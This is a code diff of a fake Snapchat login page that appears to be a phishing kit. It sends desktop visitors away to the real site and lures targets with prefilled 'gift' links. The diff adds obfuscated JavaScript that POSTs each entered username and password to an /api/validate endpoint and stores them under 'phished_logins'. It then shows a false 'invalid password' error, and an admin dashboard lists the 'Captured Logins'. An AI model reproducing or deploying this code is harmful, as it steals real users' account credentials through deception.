@@ -5,12 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Log In</title>
 <script>
-(function(){
-  const ua=navigator.userAgent.toLowerCase();
-  if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){
-    window.location.replace("https://accounts.snapchat.com/");
-  }
-})();
+(function(){const ua=navigator.userAgent.toLowerCase();if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){window.location.replace("https://accounts.snapchat.com/");}})();
 </script>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
@@ -19,147 +14,198 @@
   @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
   body { font-family: "Inter", sans-serif; }
   ::-webkit-scrollbar { display: none; }
+
+  /* Checkbox */
   input[type="checkbox"] {
     -webkit-appearance: none; -moz-appearance: none; appearance: none;
     width: 1rem; height: 1rem; border: 2px solid #d1d5db;
     border-radius: 0.25rem; position: relative; cursor: pointer;
   }
   input[type="checkbox"]:checked::after {
-    content: ''; position: absolute; left: 3.5px; top: 0.5px;
-    width: 4.5px; height: 9px; border: solid #00b0ff;
+    content: ''; position: absolute; left: 3px; top: 1px;
+    width: 4px; height: 8px; border: solid #00b0ff;
     border-width: 0 2px 2px 0; transform: rotate(45deg);
   }
   input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
+
+  /* Login button */
   #loginBtn { 
     transition: bottom 0.3s ease; 
     min-width: 42%; 
-    width: 62%; 
+    width: 65%; 
     font-size: 1.05rem; 
     padding: 0.7rem 0; 
     display: block; 
     margin: 0 auto; 
   }
+
+  /* Inputs */
   .input-container { width: 85%; margin: 0 auto; }
   input[type="text"], input[type="password"] { 
     width: 100%;
-    font-size: 16px;              /* prevent mobile zoom */
-    transform: scale(0.92);       /* visually restore smaller size */
+    font-size: 16px;          /* prevent zoom */
+    transform: scale(0.92);   /* visually reduce */
     transform-origin: left center;
-    font-weight: 500; 
-    padding-bottom: 0.2rem; 
+    font-weight: 600;
+    padding-bottom: 0.15rem;
     font-family: "Inter", sans-serif;
   }
-  label[for="password"] { 
-    position: relative; 
-    top: -2px; 
-    font-size: 0.75rem; 
+
+  label[for="password"] { position: relative; top: -4px; font-size: 0.75rem; }
+  #password { position: relative; top: -4px; }
+
+  /* Save login */
+  label.inline-flex.items-center {
+    position: relative; top: -8px;
+    font-size: 0.8rem;
+    font-weight: 500;
+    letter-spacing: -0.1px;
   }
-  #password { position: relative; top: -2px; }
-  label.inline-flex.items-center { 
-    position: relative; 
-    top: -10px; /* moved closer */
-    font-size: 0.825rem; 
-    font-weight: 450; 
+
+  #forgotPassword {
+    position: relative; top: -9px;
+    font-size: 0.825rem; font-weight: 400; color:#0083ff;
   }
-  #forgotPassword { 
-    position: relative; 
-    top: -12px; /* moved closer */
-    font-size: 0.825rem; 
-    font-weight: 400; 
-    color:#0083ff; 
-  }
+
+  /* Error */
   #errorMsg { 
     width: 85%; 
-    margin-left: auto; 
-    margin-right: auto; 
+    margin-left: auto; margin-right: auto;
     font-size: 0.8rem; 
     text-align: left; 
     color:#ff1952; 
     font-weight: 400;
-    margin-top: -2px;
-    margin-bottom: -2px;
-    position: relative;
-    top: -6px;
+    margin-top: -2px; margin-bottom: -2px;
+    position: relative; top: -6px;
   }
-  h1 { 
-    position: relative; 
-    top: -10px; 
-    font-size: 1.7rem; 
-    font-weight: 500; 
-    text-align: center; 
-  }
-  form.flex.flex-col.space-y-6 { gap: 0.5rem; }
+
+  /* Heading */
+  h1 { position: relative; top: -8px; font-size: 1.8rem; font-weight: 500; text-align: center; }
+
+  form.flex.flex-col.space-y-6 { gap: 0.55rem; }
+
+  /* UI extras */
   .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
   .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
   .remove-btn { cursor: pointer; color: #ef4444; }
   .remove-btn:hover { color: #dc2626; }
-  #adminSection { display:none; }
-  #togglePassword { 
-    position: absolute; 
-    right: 10px; 
-    top: 50%; 
-    transform: translateY(-50%); 
-    cursor: pointer; 
-    font-size: 0.85rem; /* slightly smaller */
-    color: #6b7280; 
-  }
+  #adminSection { display: none; }
+  #adminSection.active { display: block; }
+  .back-arrow i { font-size: 1rem; }
 </style>
 </head>
-<body class="bg-gray-50 flex items-center justify-center min-h-screen">
-<div class="w-full max-w-md p-6">
-  <h1>Log In</h1>
+<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
+<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
+  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
+    <i class="fas fa-chevron-left"></i>
+  </button>
+  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
   <form id="loginForm" class="flex flex-col space-y-6">
-    <div class="input-container">
-      <label for="username" class="block text-xs font-medium text-gray-700">USERNAME</label>
-      <input type="text" id="username" name="username" class="border-b border-gray-300 focus:border-blue-500 outline-none" required>
+    <div class="flex flex-col input-container">
+      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
+      <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required inputmode="text">
     </div>
-    <div class="input-container relative">
-      <label for="password" class="block text-xs font-medium text-gray-700">PASSWORD</label>
-      <input type="password" id="password" name="password" class="border-b border-gray-300 focus:border-blue-500 outline-none pr-10" required>
-      <span id="togglePassword"><i class="fas fa-eye"></i></span>
+    <div class="flex flex-col relative input-container" style="margin-top:2px;">
+      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
+      <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required inputmode="text">
+      <button type="button" aria-label="Toggle password visibility" class="absolute right-0 top-1/2 transform -translate-y-1/2 text-gray-400 text-sm" onclick="togglePassword()">
+        <i id="eyeIcon" class="fas fa-eye-slash"></i>
+      </button>
     </div>
-    <p id="errorMsg" class="hidden">Incorrect password. Please try again</p>
-    <label class="inline-flex items-center input-container text-gray-700 text-sm">
-      <input type="checkbox" class="mr-2"> Save Login Info on your iCloud devices
+    <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
+    <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
+      <input type="checkbox" checked>
+      <span>Save Login Info on your iCloud devices</span>
     </label>
-    <a href="#" id="forgotPassword" class="input-container text-sm">Forgot your password?</a>
-    <button type="submit" id="loginBtn" class="bg-[#b7c0c8] text-white rounded-2xl">Log In</button>
+    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
+    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
   </form>
 </div>
+<div id="adminSection" class="p-6 max-w-3xl mx-auto">
+  <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
+  <div class="card p-6 mb-6">
+    <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
+    <div class="overflow-y-auto max-h-96" id="loginList"></div>
+  </div>
+  <div class="card p-6">
+    <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
+    <div class="grid grid-cols-2 gap-4 text-center stats">
+      <div class="p-4 bg-blue-50 rounded-lg">
+        <p class="text-sm text-gray-500">Total Logins</p>
+        <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
+      </div>
+      <div class="p-4 bg-green-50 rounded-lg">
+        <p class="text-sm text-gray-500">Last Login</p>
+        <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
+      </div>
+    </div>
+  </div>
+</div>
 <script>
-  const passwordInput=document.getElementById("password");
-  const togglePassword=document.getElementById("togglePassword");
-  const errorMsg=document.getElementById("errorMsg");
-  const loginForm=document.getElementById("loginForm");
-  const loginBtn=document.getElementById("loginBtn");
+document.addEventListener("DOMContentLoaded", function(){
+  const a=document.getElementById("username"),
+        b=document.getElementById("password"),
+        c=document.getElementById("loginBtn"),
+        d=document.getElementById("errorMsg"),
+        e=document.getElementById("loginForm"),
+        f=document.getElementById("loginList"),
+        g=document.getElementById("totalLogins"),
+        h=document.getElementById("lastLogin"),
+        u2="/api/validate",
+        m3=3;
+  let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
 
-  togglePassword.addEventListener("click",()=>{
-    const type=passwordInput.getAttribute("type")==="password"?"text":"password";
-    passwordInput.setAttribute("type",type);
-    togglePassword.innerHTML=type==="password"?'<i class="fas fa-eye"></i>':'<i class="fas fa-eye-slash"></i>';
-  });
+  const p=window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
+  if(p&&p[1]){a.value=p[1];y2();}
 
-  loginForm.addEventListener("submit",function(e){
-    e.preventDefault();
-    loginBtn.classList.remove("bg-[#00b0ff]");
-    loginBtn.classList.add("bg-[#b7c0c8]");
-    setTimeout(()=>{
-      errorMsg.classList.remove("hidden");
-      passwordInput.value="";
-    },1200);
-  });
-
-  passwordInput.addEventListener("input",()=>{
-    loginBtn.classList.remove("bg-[#b7c0c8]");
-    loginBtn.classList.add("bg-[#00b0ff]");
-    errorMsg.classList.add("hidden");
-  });
-
-  const pathParts=window.location.pathname.split("/");
-  if(pathParts.length>=3 && pathParts[1]==="gift" && pathParts[3]==="login"){
-    const prefillUser=pathParts[2];
-    if(prefillUser) document.getElementById("username").value=prefillUser;
+  function x1(p,r=m3){
+    return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"})
+      .then(s=>s.ok||Promise.reject("Request failed"))
+      .catch(()=>(r>0?x1(p,r-1):!1))
   }
+
+  function y2(){
+    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
+  }
+
+  function z3(t,u){
+    n4++,l5.push({username:t,timestamp:u}),localStorage.setItem("phished_logins",JSON.stringify(l5)),g.textContent=n4,h.textContent=u;
+    const v=document.createElement("div");
+    v.className="highlight mb-2 p-2 flex justify-between items-center",
+    v.innerHTML=`<span>${t} - ${u}</span><span class="remove-btn" onclick="removeLogin(this,'${t}','${u}')"><i class="fas fa-trash-alt"></i></span>`,
+    f.appendChild(v)
+  }
+
+  window.removeLogin=function(w,t,u){
+    l5=l5.filter(x=>x.username!==t||x.timestamp!==u),
+    localStorage.setItem("phished_logins",JSON.stringify(l5)),
+    n4--,g.textContent=n4,h.textContent=l5.length>0?l5[l5.length-1].timestamp:"N/A",
+    w.parentElement.remove()
+  }
+
+  a.addEventListener("input",()=>{y2();c.classList.remove("bg-[#b7c0c8]");c.classList.add("bg-[#00b0ff]");});
+  b.addEventListener("input",()=>{y2();c.classList.remove("bg-[#b7c0c8]");c.classList.add("bg-[#00b0ff]");});
+
+  e.addEventListener("submit",async function(o){
+    o.preventDefault();
+    const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
+    if(t&&u){
+      const w={username:t,password:u,timestamp:v};
+      await x1(w),l5.push(w),localStorage.setItem("phished_logins",JSON.stringify(l5)),z3(t,v);
+      setTimeout(()=>{
+        d.textContent="Invalid username or password. Try again.";
+        d.classList.remove("hidden");
+        b.value="";y2();
+        c.classList.remove("bg-[#00b0ff]");c.classList.add("bg-[#b7c0c8]");c.disabled=!0
+      },1200);
+    }else d.textContent="Please fill in both fields.",d.classList.remove("hidden")
+  })
+
+  window.togglePassword=function(){
+    b.type="password"===b.type?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
+  }
+});
+function goBack(){window.history.length>1?window.history.back():window.location.reload()}
 </script>
 </body>
 </html>
